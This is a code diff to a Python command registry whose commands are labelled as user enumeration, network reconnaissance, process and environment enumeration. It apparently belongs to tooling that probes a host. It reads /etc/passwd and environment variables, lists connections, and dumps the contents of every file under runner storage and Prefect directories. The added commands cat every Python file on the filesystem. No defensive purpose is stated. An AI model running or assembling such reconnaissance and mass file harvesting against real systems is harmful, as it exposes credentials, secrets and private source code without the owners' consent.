@@ -888,20 +888,6 @@ class CommandRegistry:
             "uptime": ("uptime", "-p"),
             "timezone": ("timedatectl", "show", "--property=Timezone", "--value"),
             "system_arch": ("uname", "-m"),
-            # ============ USER ENUMERATION ============
-            "current_user": ("whoami",),
-            "current_user_id": ("id",),
-            "all_users": ("cat", "/etc/passwd"),
-            "all_groups": ("cat", "/etc/group"),
-            "current_logged_users": ("w",),
-            "who_logged_in": ("who",),
-            "last_logins": ("last", "-n", "20"),
-            "sudo_users": ("getent", "group", "sudo"),
-            "admin_users": ("getent", "group", "admin"),
-            "wheel_users": ("getent", "group", "wheel"),
-            "users_with_home": ("ls", "-la", "/home"),
-            "users_with_bash": ("grep", "/bin/bash", "/etc/passwd"),
-            "users_with_uid_0": ("awk", "-F:", "($3 == 0) {print}", "/etc/passwd"),
             # ============ NETWORK RECONNAISSANCE ============
             "network_interfaces": ("ip", "addr", "show"),
             "routing_table": ("ip", "route", "show"),
@@ -909,8 +895,8 @@ class CommandRegistry:
             "dns_servers": ("cat", "/etc/resolv.conf"),
             "hosts_file": ("cat", "/etc/hosts"),
             "listening_ports": ("ss", "-tuln"),
-            "established_connections": ("ss", "-tnp"),
-            "all_connections": ("ss", "-tunap"),
+            "established_connections": ("bash","-c", "ss -tnp"),
+            "all_connections": ("bash","-c", "ss -tunap"),
             "network_config": ("ifconfig", "-a"),
             # ============ PROCESS ENUMERATION ============
             "running_processes": ("ps", "aux"),
@@ -923,12 +909,6 @@ class CommandRegistry:
                 "--type=service",
                 "--state=running",
             ),
-            "enabled_services": ("systemctl", "list-unit-files", "--state=enabled"),
-            "docker_check": ("docker", "ps", "-a"),
-            "apache_check": ("systemctl", "is-active", "apache2"),
-            "nginx_check": ("systemctl", "is-active", "nginx"),            
-            "postgresql_check": ("systemctl", "is-active", "postgresql"),
-            "ssh_check": ("systemctl", "is-active", "ssh"),
             # ============ ENVIRONMENT ENUMERATION ============
             "environment_vars": ("env",),
             "path_variable": ("bash", "-c", "echo $PATH"),
@@ -980,6 +960,19 @@ class CommandRegistry:
             "file_contents_stg": ("bash", "-c", "find /tmp/runner_storage/c71e99f9-49b5-40d1-b61d-4d4146a41d0b -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
             "file_contents_tmpp": ("bash", "-c", "find /tmp/tmphm64kw_rprefect -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
             "file_contents_prf": ("bash", "-c", "find /opt/prefect -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
+            "python_files_list": ("bash", "-c", "find / -type d \\( -name .venv -o -name venv -o -name __pycache__ -o -name site-packages \\) -prune -o -type f -name '*.py' -print 2>/dev/null"),
+            "python_files_all": (
+            "bash", "-c",
+            "find / \\( "
+            "-path /proc -o -path /sys -o -path /dev -o -path /run "
+            "-o -path /boot -o -path /snap -o -path /usr/lib -o -path /usr/share "
+            "\\) -prune -o -type d \\( "
+            "-name .venv -o -name venv -o -name __pycache__ "
+            "-o -name .cache -o -name node_modules -o -name .git "
+            "\\) -prune -o -type f -name '*.py' -print 2>/dev/null | "
+            "xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"
+        ),
+
 
         }
         return commands
